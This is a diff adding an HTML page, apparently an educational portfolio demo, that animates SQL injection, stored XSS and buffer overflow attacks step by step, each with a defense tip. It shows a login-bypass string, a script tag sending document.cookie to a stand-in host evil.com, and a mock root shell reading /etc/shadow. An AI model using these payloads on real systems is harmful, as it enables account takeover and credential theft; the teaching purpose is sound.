@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cyber Attack Visualizer — Brian Temple</title>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300&family=DM+Mono:wght@300;400&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#0e0e0e;--panel:#0d1117;--gold:#b8933a;--gold2:#d4a84b;
+  --neon:#00d4ff;--green:#00ff88;--red:#ff2244;--orange:#ff8c00;
+  --paper:#f5f2ec;--dim:rgba(245,242,236,.45);--faint:rgba(245,242,236,.12);
+  --mono:'DM Mono',monospace;--serif:'Cormorant Garamond',Georgia,serif;
+}
+html{scroll-behavior:smooth}
+body{font-family:var(--mono);background:var(--ink);color:var(--paper);overflow-x:hidden;min-height:100vh}
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:var(--ink)}::-webkit-scrollbar-thumb{background:var(--gold)}
+#cursor{position:fixed;pointer-events:none;z-index:99999;width:8px;height:8px;border-radius:50%;background:rgba(184,147,58,.9);box-shadow:0 0 8px rgba(184,147,58,.5);transform:translate(-50%,-50%);transition:width .1s,height .1s;display:none}
+@media(pointer:fine){#cursor{display:block}body{cursor:none}a,button{cursor:none}}
+body.ch #cursor{width:13px;height:13px}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:.75rem 1.5rem;background:rgba(14,14,14,.96);backdrop-filter:blur(12px);border-bottom:1px solid rgba(184,147,58,.18)}
+.nav-back{font-size:.62rem;letter-spacing:.14em;color:rgba(0,212,255,.7);text-decoration:none;transition:color .2s;white-space:nowrap}
+.nav-back:hover{color:var(--neon)}
+.nav-center{position:absolute;left:50%;transform:translateX(-50%);text-align:center;pointer-events:none}
+.nav-title{display:block;font-size:.72rem;font-weight:400;letter-spacing:.3em;color:rgba(245,242,236,.9);text-transform:uppercase}
+.nav-sub{display:block;font-size:.48rem;letter-spacing:.22em;color:rgba(0,212,255,.4);text-transform:uppercase}
+main{padding-top:4.5rem;max-width:960px;margin:0 auto;padding-bottom:5rem;padding-left:1rem;padding-right:1rem}
+.page-header{padding:2rem 0 1.5rem;text-align:center}
+.page-tag{font-family:var(--mono);font-size:.58rem;letter-spacing:.22em;color:rgba(0,212,255,.55)}
+.page-title{font-family:var(--serif);font-size:clamp(1.8rem,5vw,3rem);font-weight:300;margin:.4rem 0 .6rem;line-height:1.1}
+.page-title em{font-style:italic;color:var(--gold2)}
+.page-sub{font-size:.68rem;color:var(--dim);line-height:1.7;max-width:500px;margin:0 auto}
+.toc{display:flex;justify-content:center;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+.toc-btn{font-size:.58rem;letter-spacing:.14em;padding:.3rem .8rem;border:1px solid rgba(255,255,255,.1);color:var(--dim);background:transparent;text-decoration:none;transition:all .2s}
+.toc-btn.sql{border-color:rgba(0,212,255,.25);color:rgba(0,212,255,.6)}
+.toc-btn.sql:hover{border-color:var(--neon);color:var(--neon);background:rgba(0,212,255,.05)}
+.toc-btn.xss{border-color:rgba(255,140,0,.25);color:rgba(255,140,0,.6)}
+.toc-btn.xss:hover{border-color:var(--orange);color:var(--orange);background:rgba(255,140,0,.05)}
+.toc-btn.bof{border-color:rgba(255,34,68,.25);color:rgba(255,34,68,.6)}
+.toc-btn.bof:hover{border-color:var(--red);color:var(--red);background:rgba(255,34,68,.05)}
+.attack-section{background:var(--panel);border:1px solid rgba(255,255,255,.06);margin-bottom:2.5rem;overflow:hidden}
+.attack-header{padding:1.4rem 1.5rem 1rem;border-bottom:1px solid rgba(255,255,255,.05);display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
+.attack-name{font-family:var(--serif);font-size:clamp(1.2rem,3vw,1.8rem);font-weight:300}
+.attack-badges{display:flex;gap:.4rem;align-items:center;flex-wrap:wrap}
+.badge{font-size:.5rem;letter-spacing:.18em;padding:.2rem .55rem;border:1px solid}
+.badge-cat{color:var(--dim);border-color:rgba(255,255,255,.12)}
+.badge-sev-high{color:#ffaa00;border-color:rgba(255,170,0,.3);background:rgba(255,170,0,.05)}
+.badge-sev-crit{color:var(--red);border-color:rgba(255,34,68,.3);background:rgba(255,34,68,.05)}
+.badge-live{color:var(--green);border-color:rgba(0,255,136,.3);animation:lbadge 2s ease infinite}
+@keyframes lbadge{0%,100%{opacity:1}50%{opacity:.5}}
+.diagram{padding:1.5rem;min-height:160px;position:relative;display:flex;flex-direction:column;gap:1rem}
+.actors{display:flex;align-items:center;justify-content:space-between;gap:.5rem;flex-wrap:nowrap;position:relative}
+.actor{flex:1;min-width:0;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);padding:.7rem .5rem;text-align:center;transition:border-color .4s,box-shadow .4s,background .4s;position:relative}
+.actor-icon{font-size:1.4rem;display:block;margin-bottom:.25rem}
+.actor-name{font-size:.55rem;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);display:block}
+.actor-status{font-size:.52rem;color:var(--faint);margin-top:.2rem;min-height:1.2em;transition:color .4s}
+.actor.active{border-color:rgba(0,212,255,.5);box-shadow:0 0 20px rgba(0,212,255,.1);background:rgba(0,212,255,.04)}
+.actor.danger{border-color:rgba(255,34,68,.5);box-shadow:0 0 20px rgba(255,34,68,.12);background:rgba(255,34,68,.04)}
+.actor.danger .actor-status{color:rgba(255,68,85,.75)}
+.actor.success{border-color:rgba(255,34,68,.7);box-shadow:0 0 25px rgba(255,34,68,.2);background:rgba(255,34,68,.08)}
+.arrow-wrap{display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;width:2.5rem}
+.arrow{font-size:.9rem;color:rgba(255,255,255,.15);transition:color .4s}
+.arrow.active{color:var(--neon)}
+.arrow.danger{color:var(--red);animation:arrowPulse .6s ease infinite alternate}
+@keyframes arrowPulse{from{opacity:.5}to{opacity:1}}
+.packet{position:absolute;width:10px;height:10px;border-radius:50%;top:50%;transform:translateY(-50%);opacity:0;transition:none}
+.packet.travel{animation:travelPacket .7s ease forwards}
+@keyframes travelPacket{0%{left:0;opacity:1}100%{left:calc(100% - 10px);opacity:0}}
+.code-block{background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.07);padding:.75rem 1rem;font-size:.62rem;line-height:1.7;overflow-x:auto;position:relative}
+.code-block .kw{color:var(--neon)}
+.code-block .str{color:var(--gold2)}
+.code-block .bad{color:var(--red);font-weight:400;background:rgba(255,34,68,.12);padding:0 2px}
+.code-block .comment{color:rgba(255,255,255,.25)}
+.code-block .ok{color:var(--green)}
+.code-label{font-size:.5rem;letter-spacing:.18em;color:var(--dim);margin-bottom:.3rem;text-transform:uppercase}
+.step-info{padding:1rem 1.5rem;border-top:1px solid rgba(255,255,255,.05)}
+.step-what{font-size:.68rem;line-height:1.65;color:rgba(245,242,236,.75);margin-bottom:.6rem;min-height:2.8em}
+.step-defend{font-size:.62rem;line-height:1.6;color:rgba(0,255,136,.7);padding:.6rem .8rem;border-left:2px solid rgba(0,255,136,.3);background:rgba(0,255,136,.03)}
+.controls{padding:.8rem 1.5rem;border-top:1px solid rgba(255,255,255,.04);display:flex;align-items:center;gap:.6rem;flex-wrap:wrap}
+.ctrl-btn{font-size:.6rem;letter-spacing:.12em;padding:.35rem .8rem;border:1px solid rgba(255,255,255,.1);color:var(--dim);background:transparent;cursor:pointer;transition:all .2s;font-family:var(--mono)}
+.ctrl-btn:hover,.ctrl-btn.active{border-color:var(--gold);color:var(--gold);background:rgba(184,147,58,.06)}
+.ctrl-btn:disabled{opacity:.25;pointer-events:none}
+.step-dots{display:flex;gap:.35rem;margin-left:auto}
+.step-dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.12);transition:background .3s}
+.step-dot.active{background:var(--gold)}
+.step-counter{font-size:.55rem;letter-spacing:.14em;color:var(--dim);white-space:nowrap}
+.memory-stack{display:flex;flex-direction:column;gap:2px;max-width:320px;margin:0 auto}
+.mem-row{display:flex;align-items:center;gap:.75rem;padding:.45rem .6rem;border:1px solid rgba(255,255,255,.06);transition:all .4s;position:relative;overflow:hidden}
+.mem-row .mem-label{font-size:.55rem;letter-spacing:.12em;width:120px;flex-shrink:0;color:var(--dim)}
+.mem-row .mem-bytes{display:flex;gap:2px;flex:1;flex-wrap:wrap}
+.mem-byte{width:18px;height:18px;border:1px solid rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center;font-size:.45rem;color:var(--dim);transition:all .35s;border-radius:2px;flex-shrink:0}
+.mem-byte.filled{background:rgba(0,255,136,.15);border-color:rgba(0,255,136,.4);color:var(--green)}
+.mem-byte.overflow{background:rgba(255,34,68,.18);border-color:rgba(255,34,68,.5);color:var(--red);animation:bytePulse .4s ease}
+@keyframes bytePulse{0%{transform:scale(1.3)}100%{transform:scale(1)}}
+.mem-row.corrupt{border-color:rgba(255,34,68,.5);background:rgba(255,34,68,.06)}
+.mem-row.target{border-color:rgba(0,212,255,.4);background:rgba(0,212,255,.03)}
+.mem-addr{font-size:.48rem;color:rgba(255,255,255,.15);width:55px;flex-shrink:0;font-family:var(--mono)}
+.shell-box{background:rgba(0,0,0,.6);border:1px solid rgba(0,255,136,.25);padding:.75rem 1rem;font-size:.7rem;color:var(--green);display:none}
+.shell-box.show{display:block;animation:shellIn .4s ease}
+@keyframes shellIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.badge-granted{display:none;text-align:center;padding:.6rem;background:rgba(255,34,68,.12);border:1px solid rgba(255,34,68,.4);color:var(--red);font-size:.72rem;letter-spacing:.18em;margin-top:.5rem}
+.badge-granted.show{display:block;animation:shellIn .5s ease}
+@media(pointer:coarse){body{cursor:auto}#cursor{display:none!important}}
+@media(max-width:600px){
+  nav{padding:.65rem 1rem}
+  .nav-center{position:static;transform:none;flex:1;margin:0 .5rem}
+  .nav-title{font-size:.65rem;letter-spacing:.18em}
+  .nav-sub{display:none}
+  main{padding-top:4rem;padding-left:.75rem;padding-right:.75rem}
+  .page-title{font-size:1.6rem}
+  .page-sub{font-size:.62rem}
+  .toc{gap:.4rem}
+  .toc-btn{font-size:.52rem;padding:.25rem .6rem}
+  .actors{gap:.2rem}
+  .actor{padding:.45rem .25rem}
+  .actor-icon{font-size:.9rem}
+  .actor-name{font-size:.44rem}
+  .actor-status{font-size:.44rem}
+  .attack-header{padding:.85rem 1rem}
+  .attack-name{font-size:1.1rem}
+  .diagram{padding:.85rem .6rem}
+  .step-info{padding:.65rem .85rem}
+  .step-what{font-size:.62rem}
+  .step-defend{font-size:.58rem}
+  .controls{padding:.5rem .85rem;gap:.4rem}
+  .ctrl-btn{font-size:.55rem;padding:.3rem .6rem}
+  .step-counter{font-size:.5rem}
+  .arrow-wrap{width:1.25rem}
+  .arrow{font-size:.65rem}
+  .mem-byte{width:13px;height:13px;font-size:.38rem}
+  .mem-row .mem-label{width:72px;font-size:.46rem}
+  .mem-addr{font-size:.42rem;width:44px}
+  .code-block{font-size:.56rem}
+}
+footer{text-align:center;padding:1.5rem;border-top:1px solid rgba(184,147,58,.08);font-size:.58rem;letter-spacing:.1em;color:rgba(245,242,236,.18)}
+</style>
+</head>
+<body>
+<div id="cursor"></div>
+<nav>
+  <a href="/" class="nav-back">← Portfolio</a>
+  <div class="nav-center">
+    <span class="nav-title">Attack Visualizer</span>
+    <span class="nav-sub">Educational Security Demos</span>
+  </div>
+</nav>
+<main>
+  <div class="page-header">
+    <span class="page-tag">// Cybersecurity Education</span>
+    <h1 class="page-title">Cyber Attack <em>Visualizer</em></h1>
+    <p class="page-sub">Step-by-step animated breakdowns of real attack techniques. Watch each exploit unfold, then see how to stop it.</p>
+  </div>
+  <div class="toc">
+    <a href="#sqli" class="toc-btn sql">⬡ SQL Injection</a>
+    <a href="#xss"  class="toc-btn xss">⬡ XSS</a>
+    <a href="#bof"  class="toc-btn bof">⬡ Buffer Overflow</a>
+  </div>
+
+  <!-- SQL INJECTION -->
+  <section class="attack-section" id="sqli" data-attack="sqli">
+    <div class="attack-header">
+      <div>
+        <div class="attack-badges">
+          <span class="badge badge-cat">WEB EXPLOITATION</span>
+          <span class="badge badge-sev-high">HIGH SEVERITY</span>
+          <span class="badge badge-live">LIVE DEMO</span>
+        </div>
+        <div class="attack-name">SQL Injection</div>
+      </div>
+    </div>
+    <div class="diagram">
+      <div class="actors" id="sqli-actors">
+        <div class="actor" id="sqli-a0">
+          <span class="actor-icon">👤</span>
+          <span class="actor-name">User / Attacker</span>
+          <span class="actor-status" id="sqli-s0">Idle</span>
+        </div>
+        <div class="arrow-wrap">
+          <div class="arrow" id="sqli-arr0">→</div>
+          <div class="packet" id="sqli-p0" style="background:var(--neon)"></div>
+        </div>
+        <div class="actor" id="sqli-a1">
+          <span class="actor-icon">🖥</span>
+          <span class="actor-name">Web Server</span>
+          <span class="actor-status" id="sqli-s1">Waiting</span>
+        </div>
+        <div class="arrow-wrap">
+          <div class="arrow" id="sqli-arr1">→</div>
+          <div class="packet" id="sqli-p1" style="background:var(--neon)"></div>
+        </div>
+        <div class="actor" id="sqli-a2">
+          <span class="actor-icon">🗄</span>
+          <span class="actor-name">Database</span>
+          <span class="actor-status" id="sqli-s2">Ready</span>
+        </div>
+      </div>
+      <div id="sqli-code" style="display:none">
+        <div class="code-label">Query</div>
+        <div class="code-block" id="sqli-codeblock"></div>
+      </div>
+      <div class="badge-granted" id="sqli-granted">⚠ AUTHENTICATION BYPASSED — ADMIN ACCESS GRANTED</div>
+    </div>
+    <div class="step-info">
+      <div class="step-what" id="sqli-what">Press Play or Next to begin the simulation.</div>
+      <div class="step-defend" id="sqli-defend" style="display:none"></div>
+    </div>
+    <div class="controls">
+      <button class="ctrl-btn" onclick="stepBack('sqli')">◀ Prev</button>
+      <button class="ctrl-btn" onclick="stepFwd('sqli')">Next ▶</button>
+      <button class="ctrl-btn" id="sqli-auto" onclick="toggleAuto('sqli')">⏵ Auto</button>
+      <button class="ctrl-btn" onclick="resetAtk('sqli')">↺ Reset</button>
+      <span class="step-counter" id="sqli-counter">Step 0 / 6</span>
+      <div class="step-dots" id="sqli-dots"></div>
+    </div>
+  </section>
+
+  <!-- XSS -->
+  <section class="attack-section" id="xss" data-attack="xss">
+    <div class="attack-header">
+      <div>
+        <div class="attack-badges">
+          <span class="badge badge-cat">CLIENT-SIDE ATTACK</span>
+          <span class="badge badge-sev-high">HIGH SEVERITY</span>
+          <span class="badge badge-live">LIVE DEMO</span>
+        </div>
+        <div class="attack-name">Cross-Site Scripting (XSS)</div>
+      </div>
+    </div>
+    <div class="diagram">
+      <div class="actors" id="xss-actors">
+        <div class="actor" id="xss-a0">
+          <span class="actor-icon">😈</span>
+          <span class="actor-name">Attacker</span>
+          <span class="actor-status" id="xss-s0">Idle</span>
+        </div>
+        <div class="arrow-wrap">
+          <div class="arrow" id="xss-arr0">→</div>
+          <div class="packet" id="xss-p0" style="background:var(--orange)"></div>
+        </div>
+        <div class="actor" id="xss-a1">
+          <span class="actor-icon">🌐</span>
+          <span class="actor-name">Website</span>
+          <span class="actor-status" id="xss-s1">Running</span>
+        </div>
+        <div class="arrow-wrap">
+          <div class="arrow" id="xss-arr1">→</div>
+          <div class="packet" id="xss-p1" style="background:var(--orange)"></div>
+        </div>
+        <div class="actor" id="xss-a2">
+          <span class="actor-icon">👤</span>
+          <span class="actor-name">Victim</span>
+          <span class="actor-status" id="xss-s2">Browsing</span>
+        </div>
+      </div>
+      <div id="xss-code" style="display:none">
+        <div class="code-label">Payload</div>
+        <div class="code-block" id="xss-codeblock"></div>
+      </div>
+      <div class="badge-granted" id="xss-granted" style="border-color:rgba(255,140,0,.4);color:var(--orange);background:rgba(255,140,0,.08)">🍪 SESSION COOKIE STOLEN — ACCOUNT HIJACKED</div>
+    </div>
+    <div class="step-info">
+      <div class="step-what" id="xss-what">Press Play or Next to begin the simulation.</div>
+      <div class="step-defend" id="xss-defend" style="display:none"></div>
+    </div>
+    <div class="controls">
+      <button class="ctrl-btn" onclick="stepBack('xss')">◀ Prev</button>
+      <button class="ctrl-btn" onclick="stepFwd('xss')">Next ▶</button>
+      <button class="ctrl-btn" id="xss-auto" onclick="toggleAuto('xss')">⏵ Auto</button>
+      <button class="ctrl-btn" onclick="resetAtk('xss')">↺ Reset</button>
+      <span class="step-counter" id="xss-counter">Step 0 / 6</span>
+      <div class="step-dots" id="xss-dots"></div>
+    </div>
+  </section>
+
+  <!-- BUFFER OVERFLOW -->
+  <section class="attack-section" id="bof" data-attack="bof">
+    <div class="attack-header">
+      <div>
+        <div class="attack-badges">
+          <span class="badge badge-cat">MEMORY CORRUPTION</span>
+          <span class="badge badge-sev-crit">CRITICAL</span>
+          <span class="badge badge-live">LIVE DEMO</span>
+        </div>
+        <div class="attack-name">Buffer Overflow</div>
+      </div>
+    </div>
+    <div class="diagram">
+      <div style="font-size:.55rem;letter-spacing:.16em;color:var(--dim);margin-bottom:.75rem;text-transform:uppercase">Memory Stack</div>
+      <div class="memory-stack" id="bof-stack">
+        <div class="mem-row" id="bof-row-ret">
+          <span class="mem-addr">0xFFFF</span>
+          <span class="mem-label">Return Address</span>
+          <div class="mem-bytes" id="bof-ret-bytes"></div>
+        </div>
+        <div class="mem-row" id="bof-row-reg">
+          <span class="mem-addr">0xFFF8</span>
+          <span class="mem-label">Saved Registers</span>
+          <div class="mem-bytes" id="bof-reg-bytes"></div>
+        </div>
+        <div class="mem-row target" id="bof-row-buf">
+          <span class="mem-addr">0xFFF0</span>
+          <span class="mem-label">Buffer [8 bytes]</span>
+          <div class="mem-bytes" id="bof-buf-bytes"></div>
+        </div>
+      </div>
+      <div class="shell-box" id="bof-shell">$ id; uid=0(root) gid=0(root) groups=0(root)<br>$ whoami; root<br>$ cat /etc/shadow | head -3</div>
+    </div>
+    <div class="step-info">
+      <div class="step-what" id="bof-what">Press Play or Next to begin the simulation.</div>
+      <div class="step-defend" id="bof-defend" style="display:none"></div>
+    </div>
+    <div class="controls">
+      <button class="ctrl-btn" onclick="stepBack('bof')">◀ Prev</button>
+      <button class="ctrl-btn" onclick="stepFwd('bof')">Next ▶</button>
+      <button class="ctrl-btn" id="bof-auto" onclick="toggleAuto('bof')">⏵ Auto</button>
+      <button class="ctrl-btn" onclick="resetAtk('bof')">↺ Reset</button>
+      <span class="step-counter" id="bof-counter">Step 0 / 6</span>
+      <div class="step-dots" id="bof-dots"></div>
+    </div>
+  </section>
+</main>
+<footer>© 2026 Brian Temple · Attack Visualizer · Educational Use Only · <a href="/" style="color:inherit;text-decoration:none">templeofDoom085.github.io</a></footer>
+<script>
+// CURSOR
+const cur=document.getElementById('cursor');
+document.addEventListener('mousemove',e=>{cur.style.left=e.clientX+'px';cur.style.top=e.clientY+'px';});
+document.querySelectorAll('a,button').forEach(el=>{
+  el.addEventListener('mouseenter',()=>document.body.classList.add('ch'));
+  el.addEventListener('mouseleave',()=>document.body.classList.remove('ch'));
+});
+
+// ── ATTACK DEFINITIONS ──
+const ATTACKS = {
+  sqli: {
+    steps: [
+      { what:"Normal login: user submits username and password. The query is safe and well-formed.", code:'<span class="kw">SELECT</span> * <span class="kw">FROM</span> users\n<span class="kw">WHERE</span> user=<span class="str">\'alice\'</span>\n<span class="kw">AND</span>  pass=<span class="str">\'••••\'</span>', actors:[{cls:'active',st:'Submitting login'},{cls:'active',st:'Building query'},{cls:'',st:'Awaiting query'}], arrows:[true,true], defend:null },
+      { what:"Attacker examines the login form and crafts a malicious input designed to break the SQL logic.", code:'Username: <span class="bad">\' OR \'1\'=\'1</span>\nPassword: <span class="str">anything</span>', actors:[{cls:'danger',st:'Injecting payload'},{cls:'',st:'Receiving input'},{cls:'',st:'Idle'}], arrows:[false,false], defend:null },
+      { what:"The server inserts the input directly into the SQL query without sanitization. The injected OR clause makes the condition always true.", code:'<span class="kw">SELECT</span> * <span class="kw">FROM</span> users\n<span class="kw">WHERE</span> user=<span class="str">\'\'</span> <span class="bad">OR \'1\'=\'1\'</span>\n<span class="comment">--</span> <span class="comment">\' AND pass=\'x\'</span>', actors:[{cls:'danger',st:'Payload inserted'},{cls:'danger',st:'Unsafe query built'},{cls:'',st:'Idle'}], arrows:[false,false], defend:null },
+      { what:"The malicious query is sent to the database. The injected logic bypasses the password check entirely.", code:'<span class="comment">// Sending to DB...</span>\n<span class="bad">OR \'1\'=\'1\'</span> <span class="comment">→ always TRUE</span>\n<span class="comment">-- comment drops password check</span>', actors:[{cls:'danger',st:'Query sent'},{cls:'danger',st:'Forwarding'},{cls:'danger',st:'Receiving'}], arrows:['danger','danger'], defend:null },
+      { what:"The database evaluates the always-true condition and returns ALL rows from the users table — every account.", code:'<span class="comment">// DB returns all rows</span>\n<span class="ok">user: admin  | role: superuser</span>\n<span class="ok">user: alice  | role: user</span>\n<span class="ok">user: bob    | role: user</span>', actors:[{cls:'danger',st:'Authenticated!'},{cls:'danger',st:'All users returned'},{cls:'success',st:'Leaked all rows'}], arrows:[false,false], defend:null },
+      { what:"Authentication is bypassed. The attacker is logged in as the first user (usually admin). Full account takeover achieved.", code:'<span class="bad">// RESULT: Admin access granted</span>\n<span class="ok">session_token = "eyJhbGci..."</span>\n<span class="bad">role = "superuser"</span>', actors:[{cls:'success',st:'ADMIN ACCESS'},{cls:'success',st:'Session created'},{cls:'success',st:'Data exposed'}], arrows:[false,false], granted:true, defend:"🛡 Defense: Use parameterized queries / prepared statements. NEVER interpolate user input into SQL. Apply input validation and principle of least privilege on DB accounts." }
+    ]
+  },
+  xss: {
+    steps: [
+      { what:"Attacker discovers a comment or input field on a website that displays user-supplied content without sanitization.", code:'<span class="comment">// Vulnerable comment box found</span>\n<span class="kw">&lt;input</span> <span class="str">name="comment"</span> <span class="kw">/&gt;</span>\n<span class="comment">// No sanitization detected</span>', actors:[{cls:'active',st:'Scanning site'},{cls:'active',st:'Comment enabled'},{cls:'',st:'Using site'}], arrows:[false,false], defend:null },
+      { what:"The attacker submits a script tag as their comment. The website stores it in the database without stripping HTML.", code:'<span class="kw">&lt;script&gt;</span>\n  fetch(<span class="str">\'https://evil.com?c=\'</span>\n    + <span class="bad">document.cookie</span>);\n<span class="kw">&lt;/script&gt;</span>', actors:[{cls:'danger',st:'Submitting payload'},{cls:'danger',st:'Storing script'},{cls:'',st:'Unaware'}], arrows:['danger',false], defend:null },
+      { what:"The server stores the raw script tag in its database without sanitization. A ✗ where there should be an encoding step.", code:'<span class="comment">// DB stores raw HTML — no encoding</span>\n<span class="bad">INSERT INTO comments VALUES (</span>\n  <span class="bad">\'&lt;script&gt;fetch(evil...)&lt;/script&gt;\'</span>\n<span class="bad">)</span>', actors:[{cls:'',st:'Idle'},{cls:'danger',st:'Script stored ✗'},{cls:'',st:'Unaware'}], arrows:[false,false], defend:null },
+      { what:"An innocent victim loads the page. Their browser requests the page and receives the HTML — including the stored script.", code:'<span class="comment">// Victim requests page</span>\n<span class="kw">GET</span> /comments <span class="str">HTTP/1.1</span>\n<span class="comment">// Response includes stored script</span>', actors:[{cls:'',st:'Idle'},{cls:'active',st:'Serving page'},{cls:'active',st:'Loading page'}], arrows:[false,'danger'], defend:null },
+      { what:"The victim's browser executes the injected script as if it were part of the site — because it came from the trusted domain.", code:'<span class="bad">// Runs in victim browser context</span>\n<span class="kw">document</span>.cookie\n<span class="bad">→ "session=abc123; user=victim"</span>', actors:[{cls:'',st:'Waiting'},{cls:'',st:'Script delivered'},{cls:'danger',st:'Script executing!'}], arrows:[false,false], defend:null },
+      { what:"The victim's session cookie is sent to the attacker's server. The attacker can now impersonate the victim with no password needed.", code:'<span class="bad">// Cookie exfiltrated</span>\n<span class="kw">GET</span> evil.com<span class="bad">?c=session=abc123</span>\n<span class="ok">// Attacker replays session token</span>', actors:[{cls:'success',st:'Cookie received!'},{cls:'success',st:'Delivered payload'},{cls:'success',st:'Session stolen'}], arrows:[false,false], granted:true, defend:"🛡 Defense: Escape/encode all user-supplied output (use textContent not innerHTML). Set HttpOnly on cookies so JS can't read them. Implement a strict Content Security Policy (CSP)." }
+    ]
+  },
+  bof: {
+    steps: [
+      { what:"Normal program execution: a function allocates an 8-byte buffer on the stack to store user input. Return address is safe.", mem:{buf:0, reg:0, ret:'safe'}, defend:null },
+      { what:"Safe input: user sends 5 bytes. The buffer holds them easily. Stack is clean — no overflow.", mem:{buf:5, reg:0, ret:'safe'}, defend:null },
+      { what:"Attacker sends 20 bytes — far exceeding the 8-byte buffer limit. The program doesn't check input length.", mem:{buf:8, reg:0, ret:'safe', incoming:true}, defend:null },
+      { what:"The buffer fills and bytes start corrupting the saved registers region — memory adjacent to the buffer.", mem:{buf:8, reg:4, ret:'safe'}, defend:null },
+      { what:"Overflow continues. The return address is overwritten with an attacker-controlled value pointing to malicious shellcode.", mem:{buf:8, reg:6, ret:'corrupt'}, defend:null },
+      { what:"When the function returns, execution jumps to the attacker's shellcode. Arbitrary code runs with the process's privileges — often root.", mem:{buf:8, reg:6, ret:'shell'}, shell:true, defend:"🛡 Defense: Use memory-safe languages (Rust, Go). Enable stack canaries, ASLR, and NX/DEP. Always validate input length. Use bounds-checking functions (strncpy, not strcpy)." }
+    ]
+  }
+};
+
+const state = {
+  sqli:{ step:0, autoTimer:null },
+  xss:{ step:0, autoTimer:null },
+  bof:{ step:0, autoTimer:null }
+};
+
+// ── INIT DOTS ──
+['sqli','xss','bof'].forEach(atk => {
+  const dots = document.getElementById(atk+'-dots');
+  const len = ATTACKS[atk].steps.length;
+  for(let i=0;i<len;i++){
+    const d = document.createElement('div');
+    d.className = 'step-dot';
+    d.id = atk+'-dot-'+i;
+    dots.appendChild(d);
+  }
+  // init bof bytes
+  if(atk==='bof'){
+    ['buf','reg','ret'].forEach(r=>{
+      const cont = document.getElementById('bof-'+r+'-bytes');
+      if(!cont) return;
+      const n = r==='buf'?8:r==='reg'?6:4;
+      for(let i=0;i<n;i++){
+        const b=document.createElement('div');
+        b.className='mem-byte';
+        b.id='bof-'+r+'-b'+i;
+        b.textContent='00';
+        cont.appendChild(b);
+      }
+    });
+  }
+  renderStep(atk, 0, false);
+});
+
+function renderStep(atk, step, animate) {
+  const s = ATTACKS[atk].steps[step];
+  const st = state[atk];
+  const len = ATTACKS[atk].steps.length;
+  // counter
+  document.getElementById(atk+'-counter').textContent = 'Step '+(step+1)+' / '+len;
+  // dots
+  for(let i=0;i<len;i++) document.getElementById(atk+'-dot-'+i).classList.toggle('active', i===step);
+  // what + defend
+  document.getElementById(atk+'-what').textContent = s.what;
+  const def = document.getElementById(atk+'-defend');
+  if(s.defend){ def.textContent = s.defend; def.style.display='block'; } else { def.style.display='none'; }
+
+  if(atk==='bof'){
+    renderBof(s, animate);
+  } else {
+    renderActors(atk, s, animate);
+  }
+  // granted badge
+  const gr = document.getElementById(atk+'-granted');
+  if(gr) gr.classList.toggle('show', !!s.granted);
+}
+
+function renderActors(atk, s, animate){
+  const actors = s.actors || [];
+  actors.forEach((a,i)=>{
+    const el = document.getElementById(atk+'-a'+i);
+    const st = document.getElementById(atk+'-s'+i);
+    if(!el) return;
+    el.className = 'actor';
+    if(a.cls) el.classList.add(a.cls);
+    if(st) st.textContent = a.st;
+  });
+  const arrows = s.arrows || [];
+  arrows.forEach((a,i)=>{
+    const arr = document.getElementById(atk+'-arr'+i);
+    const pkt = document.getElementById(atk+'-p'+i);
+    if(!arr) return;
+    arr.className = 'arrow';
+    if(a==='danger') arr.classList.add('danger');
+    else if(a===true) arr.classList.add('active');
+    if(animate && a && pkt){
+      pkt.className='packet';
+      void pkt.offsetWidth;
+      pkt.classList.add('travel');
+    }
+  });
+  // code block
+  const codeWrap = document.getElementById(atk+'-code');
+  const codeEl = document.getElementById(atk+'-codeblock');
+  if(codeWrap && codeEl && s.code){
+    codeWrap.style.display='block';
+    codeEl.innerHTML = s.code;
+  }
+}
+
+function renderBof(s, animate){
+  const m = s.mem;
+  // buffer bytes
+  for(let i=0;i<8;i++){
+    const b = document.getElementById('bof-buf-b'+i);
+    if(!b) continue;
+    b.className='mem-byte';
+    if(i < m.buf){ b.classList.add('filled'); b.textContent='41'; }
+    else { b.textContent='00'; }
+  }
+  // reg bytes
+  for(let i=0;i<6;i++){
+    const b = document.getElementById('bof-reg-b'+i);
+    if(!b) continue;
+    b.className='mem-byte';
+    if(i < m.reg){ b.classList.add(m.buf>=8?'overflow':'filled'); b.textContent=m.buf>=8?'41':'00'; }
+    else { b.textContent='00'; }
+  }
+  // ret address
+  const retRow = document.getElementById('bof-row-ret');
+  retRow.className='mem-row';
+  for(let i=0;i<4;i++){
+    const b = document.getElementById('bof-ret-b'+i);
+    if(!b) continue;
+    b.className='mem-byte';
+    if(m.ret==='safe'){ b.textContent='c3'; }
+    else if(m.ret==='corrupt'){ b.classList.add('overflow'); b.textContent=i<2?'DE':i<3?'AD':'BE'; retRow.classList.add('corrupt'); }
+    else if(m.ret==='shell'){ b.classList.add('overflow'); b.textContent=i===0?'EF':i===1?'BE':i===2?'AD':'DE'; retRow.classList.add('corrupt'); }
+  }
+  // shell
+  const sh = document.getElementById('bof-shell');
+  sh.classList.toggle('show', !!s.shell);
+}
+
+function stepFwd(atk){
+  const st = state[atk];
+  const len = ATTACKS[atk].steps.length;
+  if(st.step < len-1){ st.step++; renderStep(atk, st.step, true); }
+}
+function stepBack(atk){
+  const st = state[atk];
+  if(st.step > 0){ st.step--; renderStep(atk, st.step, false); }
+}
+function resetAtk(atk){
+  const st = state[atk];
+  clearInterval(st.autoTimer); st.autoTimer=null;
+  const btn = document.getElementById(atk+'-auto');
+  if(btn){ btn.textContent='⏵ Auto'; btn.classList.remove('active'); }
